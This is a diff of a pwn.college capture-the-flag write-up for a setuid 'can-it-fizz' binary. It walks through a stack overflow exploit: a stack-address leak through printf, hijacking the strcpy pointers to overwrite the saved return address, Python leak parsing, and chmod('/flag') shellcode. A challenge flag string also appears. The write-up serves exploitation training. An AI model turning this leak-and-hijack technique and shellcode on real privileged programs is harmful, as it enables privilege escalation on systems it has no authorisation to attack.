@@ -13802,580 +13802,339 @@ pwn.college{EQf_cMvGimapk5C6wtgB4JrjY1M.0lNyMDL4ITM0EzW}
 
 &nbsp;
 
-## Can it Fizz?
-
-Index,Offset,Decompiler Reference,Purpose
-buf[0],+0x00,LODWORD(buf[0]),Loop Limit: Set to 16.
-buf[1],+0x08,-,Unused/Padding.
-
-buf[2],+0x10,(char *)&buf[2] + 4,Input Buffer Start: This is where your read() input begins (specifically at offset +0x14).
-buf[3-8],+0x18-40,-,Overflow Zone: Your input from read() spills into these indices.
-buf[9],+0x48,(char *)&buf[9] + 4,"Local ""Buzz"" String: The string ""Buzz\n"" is stored here at offset +0x4C."
-buf[10],+0x50,HIDWORD(buf[10]),Loop Counter (i): Stored in the upper 4 bytes (offset +0x54).
-buf[11],+0x58,buf[11],"Answer Pointer: Stores the address of ""fizz"", ""Buzz"", or ""fuzzbuzz""."
-buf[12],+0x60,buf[12],Destination Pointer: The address where strcpy will write the answer.
-buf[13],+0x68,-,End of the allocated buffer array.
+## Can It Fizz
 
 ```
-hacker@program-security~can-it-fizz:~$ ls /challenge/
-can-it-fizz
+hacker@program-security~can-it-fizz:~$ /challenge/can-it-fizz
+###
+### Welcome to /challenge/can-it-fizz!
+###
+
+This challenge is a setuid binary. To get the flag, you need to read /flag.
 ```
 
-```
-hacker@program-security~can-it-fizz:~$ file /challenge/can-it-fizz 
-/challenge/can-it-fizz: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=849dacb6013ddbe19eab460b771e982f199a36a2, for GNU/Linux 3.2.0, not stripped
-```
+### Binary Analysis
 
 ```
-hacker@program-security~can-it-fizz:~$ checksec /challenge/can-it-fizz 
+hacker@program-security~can-it-fizz:~$ checksec /challenge/can-it-fizz
 [*] '/challenge/can-it-fizz'
     Arch:       amd64-64-little
     RELRO:      Full RELRO
     Stack:      No canary found
-    NX:         NX unknown - GNU_STACK missing
+    NX:         NX disabled
     PIE:        PIE enabled
-    Stack:      Executable
-    RWX:        Has RWX segments
     SHSTK:      Enabled
     IBT:        Enabled
     Stripped:   No
 ```
 
-Let's analyze the binary.
+Checklist:
+- [x] PIE enabled — binary base unknown at runtime
+- [x] No canary — stack smashing undetected
+- [x] NX disabled — stack is executable, shellcode is viable
+- [x] SHSTK/IBT present — not enforced, not a barrier
+- [x] setuid — successful shellcode runs as root
 
-### Binary Analysis
+### Decompilation
 
-```c title="/challenge/can-it-fizz" showLineNumbers
-int __fastcall main(int argc, const char **argv, const char **envp)
-{
-  setvbuf(stdin, 0LL, 2, 0LL);
-  setvbuf(stdout, 0LL, 2, 0LL);
-  puts("###");
-  printf("### Welcome to %s!\n", *argv);
-  puts("###");
-  putchar(10);
-  challenge((unsigned int)argc, argv, envp);
-  puts("### Goodbye!");
-  return 0;
+```c
+void challenge(void) {
+    long long arr[13];
+    char *input;
+    int i;
+
+    arr[0] = 0x10;                     // loop limit = 16
+    arr[1] = 0;
+    arr[12] = (char *)arr + 4;         // strcpy destination = rbp−0x6C (compile-time constant)
+
+    input = (char *)&arr[2] + 4;       // rbp−0x5C
+
+    printf("Welcome to Fizz Buzz!\n");
+
+    for (i = 0; (signed int)HIDWORD(arr[10]) < (signed int)LODWORD(arr[0]); i = HIDWORD(arr[10]) + 1) {
+        printf("%d: ", HIDWORD(arr[10]));
+        read(0, input, 0x100);         // <-- overflow here
+
+        BYTE4(arr[2]) = 0;             // zero input[0] AFTER printf
+
+        printf("You entered: %s\n", input);
+
+        if (HIDWORD(arr[10]) % 15 == 0) {
+            arr[11] = &fizzbuzz;
+            printf("FizzBuzz\n");
+        } else if (HIDWORD(arr[10]) % 3 == 0) {
+            arr[11] = &fizz;
+            printf("Fizz\n");
+        } else if (HIDWORD(arr[10]) % 5 == 0) {
+            arr[11] = (char *)&arr[9] + 4;   // <-- stack address! rbp−0x24
+            printf("Buzz\n");
+        } else {
+            arr[11] = &nothing;
+            printf("%d\n", HIDWORD(arr[10]));
+        }
+
+        strcpy((char *)arr[12], (char *)arr[11]);   // arbitrary write primitive
+
+        HIDWORD(arr[10]) = i;
+    }
 }
 ```
 
-We see that `main()` calls `challenge()`.
+The vulnerability is `read(0, input, 0x100)` writing into a buffer at `rbp−0x5C`, which overflows into the slots above it on the stack. Because `arr` is a flat 13-element array, we can corrupt `arr[10]` (loop counter), `arr[11]` (strcpy source pointer), and `arr[12]` (strcpy destination pointer) simply by writing past offset +60. After each `read()`, the binary calls `strcpy(arr[12], arr[11])` — giving us a controlled write-what-where primitive every iteration.
 
-```c title="/challenge/can-it-fizz" showLineNumbers
-__int64 challenge()
-{
-  __int64 result; // rax
-  char *arr[14]; // [rsp+20h] [rbp-70h] BYREF
+### Stack Layout
 
-  memset(buffer, 0, 0x68uLL);
-  arr[12] = (char *)buffer + 4;
-  arr[11] = (char *)&arr[2] + 4;
-  HIDWORD(arr[10]) = 0;
-  LODWORD(arr[0]) = 16;
-  strcpy((char *)&arr[9] + 4, "Buzz\n");
-  puts("Welcome to Fizz Buzz!");
-  for ( HIDWORD(arr[10]) = 0; ; ++HIDWORD(arr[10]) )
-  {
-    result = LODWORD(arr[0]);
-    if ( SHIDWORD(arr[10]) >= SLODWORD(arr[0]) )
-      break;
-    if ( SHIDWORD(arr[10]) % 15 )
-    {
-      if ( SHIDWORD(arr[10]) % 3 )
-      {
-        if ( SHIDWORD(arr[10]) % 5 )
-          arr[11] = (char *)&nothing;
-        else
-          arr[11] = (char *)&arr[9] + 4;
-      }
-      else
-      {
-        arr[11] = fizz;
-      }
-    }
-    else
-    {
-      arr[11] = (char *)&fuzzbuzz;
-    }
-    printf("%d: ", HIDWORD(arr[10]));
-    read(0, (char *)&arr[2] + 4, 0x100uLL);
-    printf("You entered: %s\n", (const char *)&arr[2] + 4);
-    BYTE4(arr[2]) = 0;
-    strcpy(arr[12], arr[11]);
-    printf("Correct answer: %s\n", arr[12]);
-  }
-  return result;
-}
-```
-
-Let's open the program in GDB.
+The frame is fixed-size (`sub rsp, 0x90`). Every offset is a compile-time constant from `rbp`.
 
 ```
-pwndbg> disass challenge 
-Dump of assembler code for function challenge:
-   0x00000000000011e9 <+0>:     endbr64
-   0x00000000000011ed <+4>:     push   rbp
-   0x00000000000011ee <+5>:     mov    rbp,rsp
-   0x00000000000011f1 <+8>:     sub    rsp,0x90
-   0x00000000000011f8 <+15>:    mov    DWORD PTR [rbp-0x74],edi
-   0x00000000000011fb <+18>:    mov    QWORD PTR [rbp-0x80],rsi
-   0x00000000000011ff <+22>:    mov    QWORD PTR [rbp-0x88],rdx
-   0x0000000000001206 <+29>:    lea    rdx,[rbp-0x70]
-   0x000000000000120a <+33>:    mov    eax,0x0
-   0x000000000000120f <+38>:    mov    ecx,0xd
-   0x0000000000001214 <+43>:    mov    rdi,rdx
-   0x0000000000001217 <+46>:    rep stos QWORD PTR es:[rdi],rax
-   0x000000000000121a <+49>:    lea    rax,[rbp-0x70]
-   0x000000000000121e <+53>:    add    rax,0x4
-   0x0000000000001222 <+57>:    mov    QWORD PTR [rbp-0x10],rax
-   0x0000000000001226 <+61>:    lea    rax,[rbp-0x70]
-   0x000000000000122a <+65>:    add    rax,0x14
-   0x000000000000122e <+69>:    mov    QWORD PTR [rbp-0x18],rax
-   0x0000000000001232 <+73>:    mov    DWORD PTR [rbp-0x1c],0x0
-   0x0000000000001239 <+80>:    mov    DWORD PTR [rbp-0x70],0x10
-   0x0000000000001240 <+87>:    lea    rax,[rbp-0x70]
-   0x0000000000001244 <+91>:    add    rax,0x4c
-   0x0000000000001248 <+95>:    mov    DWORD PTR [rax],0x7a7a7542
-   0x000000000000124e <+101>:   mov    WORD PTR [rax+0x4],0xa
-   0x0000000000001254 <+107>:   lea    rdi,[rip+0xda9]        # 0x2004
-   0x000000000000125b <+114>:   call   0x10c0 <puts@plt>
-   0x0000000000001260 <+119>:   mov    DWORD PTR [rbp-0x1c],0x0
-   0x0000000000001267 <+126>:   jmp    0x13b0 <challenge+455>
-   0x000000000000126c <+131>:   mov    edx,DWORD PTR [rbp-0x1c]
-   0x000000000000126f <+134>:   movsxd rax,edx
-   0x0000000000001272 <+137>:   imul   rax,rax,0xffffffff88888889
-   0x0000000000001279 <+144>:   shr    rax,0x20
-   0x000000000000127d <+148>:   add    eax,edx
-   0x000000000000127f <+150>:   sar    eax,0x3
-   0x0000000000001282 <+153>:   mov    ecx,eax
-   0x0000000000001284 <+155>:   mov    eax,edx
-   0x0000000000001286 <+157>:   sar    eax,0x1f
-   0x0000000000001289 <+160>:   sub    ecx,eax
-   0x000000000000128b <+162>:   mov    eax,ecx
-   0x000000000000128d <+164>:   mov    ecx,eax
-   0x000000000000128f <+166>:   shl    ecx,0x4
-   0x0000000000001292 <+169>:   sub    ecx,eax
-   0x0000000000001294 <+171>:   mov    eax,edx
-   0x0000000000001296 <+173>:   sub    eax,ecx
-   0x0000000000001298 <+175>:   test   eax,eax
-   0x000000000000129a <+177>:   jne    0x12ac <challenge+195>
-   0x000000000000129c <+179>:   lea    rax,[rip+0x2d75]        # 0x4018 <fuzzbuzz>
-   0x00000000000012a3 <+186>:   mov    QWORD PTR [rbp-0x18],rax
-   0x00000000000012a7 <+190>:   jmp    0x132c <challenge+323>
-   0x00000000000012ac <+195>:   mov    ecx,DWORD PTR [rbp-0x1c]
-   0x00000000000012af <+198>:   movsxd rax,ecx
-   0x00000000000012b2 <+201>:   imul   rax,rax,0x55555556
-   0x00000000000012b9 <+208>:   shr    rax,0x20
-   0x00000000000012bd <+212>:   mov    rdx,rax
-   0x00000000000012c0 <+215>:   mov    eax,ecx
-   0x00000000000012c2 <+217>:   sar    eax,0x1f
-   0x00000000000012c5 <+220>:   mov    esi,edx
-   0x00000000000012c7 <+222>:   sub    esi,eax
-   0x00000000000012c9 <+224>:   mov    eax,esi
-   0x00000000000012cb <+226>:   mov    edx,eax
-   0x00000000000012cd <+228>:   add    edx,edx
-   0x00000000000012cf <+230>:   add    edx,eax
-   0x00000000000012d1 <+232>:   mov    eax,ecx
-   0x00000000000012d3 <+234>:   sub    eax,edx
-   0x00000000000012d5 <+236>:   test   eax,eax
-   0x00000000000012d7 <+238>:   jne    0x12e6 <challenge+253>
-   0x00000000000012d9 <+240>:   lea    rax,[rip+0x2d30]        # 0x4010 <fizz>
-   0x00000000000012e0 <+247>:   mov    QWORD PTR [rbp-0x18],rax
-   0x00000000000012e4 <+251>:   jmp    0x132c <challenge+323>
-   0x00000000000012e6 <+253>:   mov    ecx,DWORD PTR [rbp-0x1c]
-   0x00000000000012e9 <+256>:   movsxd rax,ecx
-   0x00000000000012ec <+259>:   imul   rax,rax,0x66666667
-   0x00000000000012f3 <+266>:   shr    rax,0x20
-   0x00000000000012f7 <+270>:   mov    edx,eax
-   0x00000000000012f9 <+272>:   sar    edx,1
-   0x00000000000012fb <+274>:   mov    eax,ecx
-   0x00000000000012fd <+276>:   sar    eax,0x1f
-   0x0000000000001300 <+279>:   sub    edx,eax
-   0x0000000000001302 <+281>:   mov    eax,edx
-   0x0000000000001304 <+283>:   mov    edx,eax
-   0x0000000000001306 <+285>:   shl    edx,0x2
-   0x0000000000001309 <+288>:   add    edx,eax
-   0x000000000000130b <+290>:   mov    eax,ecx
-   0x000000000000130d <+292>:   sub    eax,edx
-   0x000000000000130f <+294>:   test   eax,eax
-   0x0000000000001311 <+296>:   jne    0x1321 <challenge+312>
-   0x0000000000001313 <+298>:   lea    rax,[rbp-0x70]
-   0x0000000000001317 <+302>:   add    rax,0x4c
-   0x000000000000131b <+306>:   mov    QWORD PTR [rbp-0x18],rax
-   0x000000000000131f <+310>:   jmp    0x132c <challenge+323>
-   0x0000000000001321 <+312>:   lea    rax,[rip+0x2cf8]        # 0x4020 <nothing>
-   0x0000000000001328 <+319>:   mov    QWORD PTR [rbp-0x18],rax
-   0x000000000000132c <+323>:   mov    eax,DWORD PTR [rbp-0x1c]
-   0x000000000000132f <+326>:   mov    esi,eax
-   0x0000000000001331 <+328>:   lea    rdi,[rip+0xce2]        # 0x201a
-   0x0000000000001338 <+335>:   mov    eax,0x0
-   0x000000000000133d <+340>:   call   0x10d0 <printf@plt>
-   0x0000000000001342 <+345>:   lea    rax,[rbp-0x70]
-   0x0000000000001346 <+349>:   add    rax,0x14
-   0x000000000000134a <+353>:   mov    edx,0x100
-   0x000000000000134f <+358>:   mov    rsi,rax
-   0x0000000000001352 <+361>:   mov    edi,0x0
-   0x0000000000001357 <+366>:   call   0x10e0 <read@plt>
-   0x000000000000135c <+371>:   lea    rax,[rbp-0x70]
-   0x0000000000001360 <+375>:   add    rax,0x14
-   0x0000000000001364 <+379>:   mov    rsi,rax
-   0x0000000000001367 <+382>:   lea    rdi,[rip+0xcb1]        # 0x201f
-   0x000000000000136e <+389>:   mov    eax,0x0
-   0x0000000000001373 <+394>:   call   0x10d0 <printf@plt>
-   0x0000000000001378 <+399>:   mov    BYTE PTR [rbp-0x5c],0x0
-   0x000000000000137c <+403>:   mov    rdx,QWORD PTR [rbp-0x18]
-   0x0000000000001380 <+407>:   mov    rax,QWORD PTR [rbp-0x10]
-   0x0000000000001384 <+411>:   mov    rsi,rdx
-   0x0000000000001387 <+414>:   mov    rdi,rax
-   0x000000000000138a <+417>:   call   0x10b0 <strcpy@plt>
-   0x000000000000138f <+422>:   mov    rax,QWORD PTR [rbp-0x10]
-   0x0000000000001393 <+426>:   mov    rsi,rax
-   0x0000000000001396 <+429>:   lea    rdi,[rip+0xc93]        # 0x2030
-   0x000000000000139d <+436>:   mov    eax,0x0
-   0x00000000000013a2 <+441>:   call   0x10d0 <printf@plt>
-   0x00000000000013a7 <+446>:   mov    eax,DWORD PTR [rbp-0x1c]
-   0x00000000000013aa <+449>:   add    eax,0x1
-   0x00000000000013ad <+452>:   mov    DWORD PTR [rbp-0x1c],eax
-   0x00000000000013b0 <+455>:   mov    edx,DWORD PTR [rbp-0x1c]
-   0x00000000000013b3 <+458>:   mov    eax,DWORD PTR [rbp-0x70]
-   0x00000000000013b6 <+461>:   cmp    edx,eax
-   0x00000000000013b8 <+463>:   jl     0x126c <challenge+131>
-   0x00000000000013be <+469>:   nop
-   0x00000000000013bf <+470>:   leave
-   0x00000000000013c0 <+471>:   ret
-End of assembler dump.
+<== Value is stored at the address
+<-- Points to the address
+
+                           ┌───────────────────────────┐
+           rbp−0x70 (+00)  │  arr[0] LODWORD = 0x10    │ loop limit, never corrupted
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x5C (+04)  │  arr[2] HIDWORD = input   │ read() lands here; BYTE4 zeroed after printf
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x58 (+08)  │  arr[3..8] = shellcode    │ 56 bytes of usable shellcode space
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x28 (+52)  │  arr[9] LODWORD           │ local Buzz string "Buzz"
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x24 (+56)  │  arr[9] HIDWORD "\n\0\0"  │ arr[11] points here in Buzz branch — THE LEAK
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x20 (+60)  │  arr[10] LODWORD          │ holds p64(sc_addr) in Stage 2
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x1C (+64)  │  arr[10] HIDWORD = i      │ loop counter; overwrite with 0xFFFFFFFF (−1)
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x18 (+68)  │  arr[11]                  │ ptr to answer string; overwrite → strcpy source
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x10 (+76)  │  arr[12] = rbp−0x6C       │ compile-time constant; overwrite → saved_rip addr
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x00        │  saved RBP                │
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x08        │  saved RIP                │ strcpy writes sc_addr here
+                           └───────────────────────────┘
 ```
 
-```
-pwndbg> break *(challenge+366)
-Breakpoint 1 at 0x1357
-```
+### Which Branch Gives the Leak
+
+The `strcpy` primitive uses `arr[11]` as its source pointer. In three of the four branches `arr[11]` is set to a BSS address — statically-linked, already known, tells us nothing about where the stack is. Only the **Buzz branch** (`i % 5 == 0`, `i % 3 != 0`, `i % 15 != 0`) sets `arr[11]` to `(char *)&arr[9] + 4` — a live stack address at `rbp−0x24`. Leaking that value gives us `rbp` and, from there, every address we need.
 
 ```
-pwndbg> run
-Starting program: /challenge/can-it-fizz 
-###
-### Welcome to /challenge/can-it-fizz!
-###
-
-Welcome to Fizz Buzz!
-0: 
-Breakpoint 1, 0x00005fed7d55a357 in challenge ()
-LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
-───────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────
- RAX  0x7ffded2c72f4 ◂— 0
- RBX  0x5fed7d55a480 (__libc_csu_init) ◂— endbr64 
- RCX  0
- RDX  0x100
- RDI  0
- RSI  0x7ffded2c72f4 ◂— 0
- R8   3
- R9   3
- R10  0x5fed7d55b01c ◂— 0x6520756f5900203a /* ': ' */
- R11  0x246
- R12  0x5fed7d55a100 (_start) ◂— endbr64 
- R13  0x7ffded2c7470 ◂— 1
- R14  0
- R15  0
- RBP  0x7ffded2c7350 —▸ 0x7ffded2c7380 ◂— 0
- RSP  0x7ffded2c72c0 ◂— 0xd68 /* 'h\r' */
- RIP  0x5fed7d55a357 (challenge+366) ◂— call read@plt
-────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────
- ► 0x5fed7d55a357 <challenge+366>    call   read@plt                    <read@plt>
-        fd: 0 (/dev/pts/0)
-        buf: 0x7ffded2c72f4 ◂— 0
-        nbytes: 0x100
- 
-   0x5fed7d55a35c <challenge+371>    lea    rax, [rbp - 0x70]
-   0x5fed7d55a360 <challenge+375>    add    rax, 0x14
-   0x5fed7d55a364 <challenge+379>    mov    rsi, rax
-   0x5fed7d55a367 <challenge+382>    lea    rdi, [rip + 0xcb1]     RDI => 0x5fed7d55b01f ◂— 'You entered: %s\n'
-   0x5fed7d55a36e <challenge+389>    mov    eax, 0                 EAX => 0
-   0x5fed7d55a373 <challenge+394>    call   printf@plt                  <printf@plt>
- 
-   0x5fed7d55a378 <challenge+399>    mov    byte ptr [rbp - 0x5c], 0
-   0x5fed7d55a37c <challenge+403>    mov    rdx, qword ptr [rbp - 0x18]
-   0x5fed7d55a380 <challenge+407>    mov    rax, qword ptr [rbp - 0x10]
-   0x5fed7d55a384 <challenge+411>    mov    rsi, rdx
-─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────
-00:0000│ rsp         0x7ffded2c72c0 ◂— 0xd68 /* 'h\r' */
-01:0008│-088         0x7ffded2c72c8 —▸ 0x7ffded2c7488 —▸ 0x7ffded2c969b ◂— 'SHELL=/run/dojo/bin/bash'
-02:0010│-080         0x7ffded2c72d0 —▸ 0x7ffded2c7478 —▸ 0x7ffded2c9684 ◂— '/challenge/can-it-fizz'
-03:0018│-078         0x7ffded2c72d8 ◂— 0x10000000a /* '\n' */
-04:0020│-070         0x7ffded2c72e0 ◂— 0x10
-05:0028│-068         0x7ffded2c72e8 ◂— 0
-06:0030│ rax-4 rsi-4 0x7ffded2c72f0 ◂— 0
-07:0038│-058         0x7ffded2c72f8 ◂— 0
-───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────
- ► 0   0x5fed7d55a357 challenge+366
-   1   0x5fed7d55a466 main+165
-   2   0x7d62ab78f083 __libc_start_main+243
-   3   0x5fed7d55a12e _start+46
-────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+                          counter i
+                              │
+                    ┌─────────▼─────────┐
+                    │   i % 15 == 0?    │
+                    └──┬────────────────┘
+             yes ──────┘            no ──────────────────────────┐
+                                                                  │
+             ┌────────────────────┐               ┌──────────────▼──────────────┐
+             │      fizzbuzz      │               │        i % 3 == 0?          │
+             │    BSS address     │               └──┬──────────────────────────┘
+             └────────────────────┘        yes ──────┘                  no ──────┐
+             ✗ not a stack addr                                                   │
+                                           ┌──────────────────┐   ┌──────────────▼──────────────┐
+                                           │       fizz        │   │        i % 5 == 0?          │
+                                           │   BSS address     │   └──┬──────────────────────────┘
+                                           └──────────────────┘       │yes                no ────┐
+                                           ✗ not a stack addr         │                          │
+                                                        ┌─────────────▼──────────┐  ┌────────────▼────────┐
+                                                        │          Buzz          │  │       nothing        │
+                                                        │  arr[11] = &arr[9]+4  │  │     BSS address      │
+                                                        │     = rbp−0x24        │  └─────────────────────-┘
+                                                        └────────────────────────┘  ✗ not a stack addr
+                                                        ✓ stack addr → rbp known
 ```
 
-- [x] Location of buffer: `0x7ffded2c72f4`
+The first Buzz iteration is `i = 5`. We burn iterations 0–4 with dummy newlines and send the Stage 1 payload on `i = 5`.
+
+### The printf Spill
+
+`printf("You entered: %s\n", input)` starts printing from `rbp−0x5C` and stops at the first null byte. For it to reach `arr[11]` at offset +68, every byte from +0 to +67 must be non-null.
+
+There is one trap: `arr[9]` HIDWORD at offset +56 initially contains `"\n\0\0\0"`. That `\0` at offset +57 stops `printf` before it reaches the counter or `arr[11]`. The Stage 1 payload must overwrite those four bytes with non-null values (e.g. `b"CCCC"`) to bridge the gap.
+
+`BYTE4(arr[2]) = 0` runs *after* `printf`, so zeroing input[0] does not interfere with the spill.
+
+### Stage 1 — Leak Stack Address
+
+Payload on `i = 5` (Buzz branch):
 
 ```
-pwndbg> info frame
-Stack level 0, frame at 0x7ffded2c7360:
- rip = 0x5fed7d55a357 in challenge; saved rip = 0x5fed7d55a466
- called by frame at 0x7ffded2c7390
- Arglist at 0x7ffded2c7350, args: 
- Locals at 0x7ffded2c7350, Previous frame's sp is 0x7ffded2c7360
- Saved registers:
-  rbp at 0x7ffded2c7350, rip at 0x7ffded2c7358
++0   b"A" × 52       pad through arr[3..9] low
++52  b"BUZZ"         arr[9] LODWORD — non-null, keeps printf flowing
++56  b"CCCC"         arr[9] HIDWORD — plugs the "\n\0" gap
++60  b"D" × 4        arr[10] LODWORD — filler
++64  p32(0xFFFFFFFF) arr[10] HIDWORD = −1, loop continues
 ```
 
+Stack after Stage 1 payload is received, before `printf` fires:
+
 ```
-pwndbg> x/30gx $rsi-0x4
-0x7ffded2c72f0: 0x0000000000000000      0x0000000000000000
-0x7ffded2c7300: 0x0000000000000000      0x0000000000000000
-0x7ffded2c7310: 0x0000000000000000      0x0000000000000000
-0x7ffded2c7320: 0x0000000000000000      0x7a7a754200000000
-0x7ffded2c7330: 0x000000000000000a      0x00005fed7d55d018
-0x7ffded2c7340: 0x00007ffded2c72e4      0x00005fed7d55a100
-0x7ffded2c7350: 0x00007ffded2c7380      0x00005fed7d55a466
-0x7ffded2c7360: 0x0000000000000000      0x00007ffded2c7488
-0x7ffded2c7370: 0x00007ffded2c7478      0x0000000100000000
-0x7ffded2c7380: 0x0000000000000000      0x00007d62ab78f083
-0x7ffded2c7390: 0x00007d62ab99a620      0x00007ffded2c7478
-0x7ffded2c73a0: 0x0000000100000000      0x00005fed7d55a3c1
-0x7ffded2c73b0: 0x00005fed7d55a480      0x921bc82ab589ed38
-0x7ffded2c73c0: 0x00005fed7d55a100      0x00007ffded2c7470
-0x7ffded2c73d0: 0x0000000000000000      0x0000000000000000
+<== Value is stored at the address
+<-- Points to the address
+
+                           ┌───────────────────────────┐
+           rbp−0x5C (+00)  │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAA" × 6½ — printf starts here )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x28 (+52)  │  42 55 5a 5a              │ ( b"BUZZ" — arr[9] LODWORD, non-null )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x24 (+56)  │  43 43 43 43              │ ( b"CCCC" — arr[9] HIDWORD, gap bridged )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x20 (+60)  │  44 44 44 44              │ ( b"DDDD" — arr[10] LODWORD, filler )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x1C (+64)  │  ff ff ff ff              │ ( 0xFFFFFFFF = −1, counter: loop continues )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x18 (+68)  │  ?? ?? ?? ?? ?? ?? 00 00  │ --> ( arr[11] = rbp−0x24 ← THE LEAK )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x10 (+76)  │  rbp − 0x6C ...           │ ( arr[12] = compile-time dest, unchanged )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp+0x08        │  saved RIP                │ unchanged
+                           └───────────────────────────┘
 ```
 
-Address,Value (Hex),Explanation
-0x7ffded2c72f0,0000000000000000,"(Address starts at ...2f4, so first 4 bytes are padding)"
-0x7ffded2c72f8,0000000000000000,buf[3]
-...,...,...
-0x7ffded2c7328,7a7a754200000000,"buf[9]. Note 7a7a7542 is ""Buzz""."
-0x7ffded2c7330,000000000000000a,buf[10]. The 0a is the counter (current iteration 10).
-0x7ffded2c7334,00000000,HIDWORD(buf[10]) — THIS IS YOUR TARGET.
-0x7ffded2c7338,00005fed7d55d018,"buf[11] (Pointer to ""Correct Answer"")"
-0x7ffded2c7340,00007ffded2c72e4,buf[12] (Pointer to buffer + 4)
-0x7ffded2c7358,00005fed7d55a466,Saved RIP (Return Address)
+We parse the 6 non-null bytes that `printf` spills from offset +68:
 
-- [x] Location of buffer: `0x7ffded2c72f4`
-- [x] Location of pointer to leak: `0x7ffded2c7340`
-- [x] Required number of bytes: `76`
+```python
+raw         = p.recvn(75)
+leaked_addr = u64(raw[68:74] + b"\x00\x00")   # arr[11] = rbp−0x24
+rbp         = leaked_addr + 0x24
+sc_addr     = rbp - 0x58                       # shellcode lives at +4
+saved_rip   = rbp + 0x08
+```
+
+After this iteration the counter increments: −1 + 1 = 0. The next iteration starts at `i = 0` (FizzBuzz).
+
+### Stage 2 — Shellcode + strcpy Hijack
+
+`i = 0` is FizzBuzz, so `arr[11]` will be set to `&fizzbuzz` (a BSS address) by the branch logic — but we overwrite `arr[11]` and `arr[12]` ourselves before `strcpy` fires, so the branch assignment doesn't matter.
+
+The shellcode must fit in 52 bytes (offset +4 to +55). `BYTE4(arr[2])` zeroes input[0] after `printf`, so the first 4 bytes are sacrificed as NOP sled. Shellcode starts at `rbp−0x58` = `sc_addr`.
+
+Shellcode — `chmod("/flag", 4)` then `exit(0)`:
+
+```asm
+mov rax, 0x67616c662f   ; "/flag" as immediate (no null bytes)
+push rax
+mov rdi, rsp            ; rdi = pointer to "/flag" on stack
+push 4
+pop rsi                 ; rsi = 4 (read permission)
+xor eax, eax
+mov al, 90              ; syscall: chmod
+syscall
+xor edi, edi
+xor eax, eax
+mov al, 60              ; syscall: exit
+syscall
+```
+
+31 bytes. Stack after Stage 2 payload is received, before `strcpy` fires:
+
+```
+<== Value is stored at the address
+<-- Points to the address
+
+                           ┌───────────────────────────┐
+           rbp−0x5C (+00)  │  90 90 90 90              │ ( NOP sled — BYTE4 will zero input[0] here )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x58 (+04)  │  [ chmod shellcode ]      │ ( 31 bytes of shellcode )  ← sc_addr
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+                    (+35)  │  90 90 90 90 90 90 90 ... │ ( NOP padding to offset +60 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x20 (+60)  │  [ sc_addr bytes ]        │ ( arr[10]: HIDWORD ≥ 16 → loop exits )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x18 (+68)  │  [ rbp − 0x20 ]           │ --> ( arr[11] = ptr to sc_addr bytes above )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+           rbp−0x10 (+76)  │  [ saved_rip addr ]       │ --> ( arr[12] = strcpy destination )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
